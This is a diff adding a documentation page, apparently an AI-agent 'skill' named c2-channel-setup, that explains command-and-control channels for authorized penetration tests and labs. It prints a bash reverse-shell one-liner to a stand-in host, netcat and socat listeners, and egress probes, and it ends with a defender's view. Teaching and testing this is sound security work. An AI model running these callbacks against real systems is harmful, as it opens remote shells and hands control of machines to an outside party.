@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: c2-channel-setup</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../index.html#agents">Agents</a>
+<a href="../index.html#brains">Brains</a>
+<a href="../index.html#playbooks">Playbooks</a>
+<a href="../index.html#decisions">Decisions</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>c2-channel-setup</h2><div class="meta"><span class="badge gray">c2</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">95/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when you need to establish command and control</p><div class="deps"><span class="kind">sub-skill of:</span> <a href="c2-fundamentals.html">c2-fundamentals</a></div><div class="deps"><span class="kind">requires:</span> <a href="c2-fundamentals.html">c2-fundamentals</a></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="network-pivoting.html">network-pivoting</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>Python</td><td>3.12</td></tr><tr><td>OpenSSH</td><td>9.6</td></tr><tr><td>socat</td><td>1.7</td></tr></tbody></table><p>A command and control channel is the line back to a compromised host: how you send commands and receive results. This skill covers setting up basic C2 channels on authorized engagements and in labs: choosing the protocol, standing up the listener, generating the callback payload, and proving the channel works. It stays at the fundamentals level; operational C2 tradecraft is c2-opsec, and payload delivery is c2-payload-staging.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Confirm the engagement authorizes C2 callbacks to your infrastructure.</li>
+<li>Choose the channel protocol based on the target&#x27;s egress rules.</li>
+<li>Set up the listener on your infrastructure with logging.</li>
+<li>Generate the callback payload for the target platform.</li>
+<li>Deliver the payload through the approved vector.</li>
+<li>Validate the channel: run a benign command and confirm the output.</li>
+<li>Log every session with timestamps for the report.</li>
+</ol>
+<h2>1. Choosing the channel</h2>
+<pre><code class="language-bash"># Decision guide:
+# HTTPS (443): blends with web traffic, best default when egress is open
+# DNS: works when only DNS egress exists, slow, for short commands
+# Plain TCP: fine in labs, too obvious in production tests
+
+# Test egress from the target&#x27;s network position first
+# (from a foothold or the approved vantage point)
+curl -s -o /dev/null -w &#x27;https: %{http_code}\n&#x27; https://your-infra.example/
+nslookup test.your-infra.example
+timeout 3 bash -c &#x27;&lt;/dev/tcp/your-infra.example/443&#x27; &amp;&amp; echo &quot;tcp 443 open&quot;</code></pre>
+<p>Match the channel to the egress you measured, not the egress you assume. A callback that cannot leave the network is a failed test, not a quiet one.</p>
+<h2>2. Listener setup</h2>
+<pre><code class="language-bash"># Simple HTTPS listener concept with Python (lab use)
+# Production engagements use established frameworks; the principle is:
+# - TLS with a valid-looking certificate
+# - Logging of every session event
+# - Authentication so only your payloads connect
+
+# Netcat listener for plain-TCP lab callbacks
+nc -lvnp 4444 2&gt;&amp;1 | tee /tmp/c2_sessions.log
+
+# Socat with TLS for a slightly more realistic lab listener
+socat OPENSSL-LISTEN:4433,cert=/tmp/lab.pem,verify=0,fork -</code></pre>
+<p>Log everything: connection times, source IPs, commands sent. The session log is both your operational record and the report&#x27;s evidence.</p>
+<h2>3. Payload generation and validation</h2>
+<pre><code class="language-bash"># Reverse shell payloads are the simplest channel test (lab/approved only)
+# Linux:
+bash -i &gt;&amp; /dev/tcp/your-infra.example/443 0&gt;&amp;1
+# PowerShell equivalent on Windows targets (obfuscated in real use)
+
+# Validate the channel with harmless commands only at first
+# whoami ; hostname ; echo channel-ok
+
+# Then confirm output returns correctly for longer outputs
+# (paging, encoding, and timeouts all break naive channels)</code></pre>
+<p>Generate payloads for the exact target platform and test them in a lab replica first. A payload that crashes the target process on a production host is an availability incident; lab validation is not optional.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>Egress filtering blocks your channel. Fall back through the protocol</li>
+<p>list (HTTPS, DNS, ICMP) based on the egress test, or accept that C2 is not possible from this position.</p>
+<li>The callback works but dies quickly. Session persistence is a separate</li>
+<p>problem; note the channel works and address stability in the op plan.</p>
+<li>TLS interception breaks your listener cert. Use a proper certificate</li>
+<p>chain or tunnel inside an allowed protocol.</p>
+<li>Multiple targets need multiple channels. Separate listeners per target</li>
+<p>keep sessions attributable and logs clean.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>The engagement needs a full C2 framework: that is a bigger</li>
+<p>operational decision (infrastructure, profiles, redirectors); raise it with the test lead rather than improvising.</p>
+<li>The channel must survive reboots: persistence techniques need separate</li>
+<p>approval on production systems.</p>
+<li>You only need proof of callback, not a working shell: a DNS lookup or</li>
+<p>HTTP hit to your listener proves egress and execution with far less risk.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see C2 as beacons: regular outbound connections to rare destinations, odd TLS certificates, DNS queries with encoded subdomains, and processes making network connections they never should. EDR and NDR flag all of it. Defenses are egress filtering with allow-listing, TLS inspection, DNS monitoring, and alerting on beacon-like patterns. The attacker&#x27;s channel choice is a direct function of what the defender lets out.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1071 (Application Layer Protocol).</li>
+<li>MITRE ATT&amp;CK T1071.001 (Application Layer Protocol: Web Protocols).</li>
+<li>MITRE ATT&amp;CK T1105 (Ingress Tool Transfer).</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
